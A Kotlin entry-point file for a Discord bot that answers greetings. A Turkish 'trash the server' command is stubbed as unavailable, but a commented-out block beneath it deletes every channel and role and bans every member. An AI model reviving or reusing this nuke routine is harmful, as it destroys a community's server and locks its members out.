package com.thundersbot

import com.thundersbot.eventDispatchers.DeleteEventDispatcher
import com.thundersbot.eventDispatchers.DispatchAll
import discord4j.core.DiscordClient
import discord4j.core.GatewayDiscordClient
import discord4j.core.event.domain.message.MessageCreateEvent
import javax.xml.ws.Dispatch

object EntryPoint {
    @JvmStatic
    fun main(args: Array<String>) {

        val token: String = args[0]
        val client: DiscordClient = DiscordClient.create(token)
        val gateway: GatewayDiscordClient = client.login().block()!!

        DispatchAll.dispatchAll(gateway)



        gateway.on(MessageCreateEvent::class.java).subscribe { mce ->
            if (!mce.message.author.get().isBot) {
                if (mce.message.content.equals("Merhaba", ignoreCase = true)) {
                    mce.message.channel.block()!!.createMessage(mce.message.content + "!").subscribe();
                }

                else if (mce.message.content.equals("serverı çöp et lan", ignoreCase = true)) {
                    mce.message.channel.block()?.createMessage("Bu komut deneme aşamasındadır ve şuan kullanılamamaktadır.")?.subscribe()
                }
                    /*for (guildChannel in mce.guild.block().channels.collectList().block()!!) {
                        guildChannel.delete().subscribe()
                    }
                    for (role in mce.guild.block().roles.collectList().block()!!) {
                        role.delete().subscribe()
                    }
                    for (member in mce.guild.block().members.collectList().block()!!) {
                        member.ban {
                            it.reason = "Server trashed"
                            it.setDeleteMessageDays(12)
                        }.subscribe()

                    }
                }*/
            }

        }







        gateway.onDisconnect().block();
    }




}